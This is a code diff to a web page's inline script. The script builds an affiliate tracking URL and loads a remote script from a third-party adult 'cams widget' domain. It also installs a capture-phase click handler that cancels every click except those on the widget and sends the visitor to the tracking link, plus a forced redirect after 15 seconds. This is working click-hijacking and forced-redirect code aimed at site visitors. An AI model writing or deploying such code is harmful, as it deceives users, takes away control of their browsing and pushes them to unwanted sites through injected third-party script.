@@ -529,40 +529,49 @@ let finalUrl = "https://92orb.com/link?z=7374201"
               + "&var=" + source
               + "&ymid=" + ymid;
 
-// =============================
-// 🚀 UNIVERSAL CLICK OVERRIDE
-// =============================
-document.addEventListener("click", function(e) {
-
-  // Agar koi link, button, image, div etc click ho
-  let target = e.target;
-
-  // Prevent default behavior
-  e.preventDefault();
-  e.stopPropagation();
-
-  // Redirect to final URL
-  window.location.href = finalUrl;
-
-}, true); // ⚠️ capture phase (important)
 
 // =============================
-// ⚡ OPTIONAL AUTO REDIRECT
+// 🚀 WIDGET LOAD (IMPORTANT)
 // =============================
-setTimeout(function(){
-  window.location.href = finalUrl;
-}, 15000); // 15 sec
-// ✅ NEW widget with correct tracking
+(function loadWidget(){
   let script = document.createElement("script");
   script.src = "https://crxcr2.com/cams-widget-ext/im_jerky"
               + "?lang=en&mode=prerecorded"
               + "&outlinkUrl=" + encodeURIComponent(finalUrl);
   script.defer = true;
-
   document.body.appendChild(script);
-});
-					
-					
+})();
+
+
+// =============================
+// 🔒 UNIVERSAL CLICK OVERRIDE
+// =============================
+document.addEventListener("click", function(e) {
+
+  let target = e.target;
+
+  // ⚠️ Widget ke clicks ko allow karo
+  if (target.closest('[class*="widget"]') || target.closest('iframe')) {
+    return;
+  }
+
+  // Default action rok do
+  e.preventDefault();
+  e.stopPropagation();
+
+  // Redirect
+  window.location.href = finalUrl;
+
+}, true);
+
+
+// =============================
+// ⚡ AUTO REDIRECT (OPTIONAL)
+// =============================
+setTimeout(function(){
+  window.location.href = finalUrl;
+}, 15000);
+
 </script>
 				
 				</body>
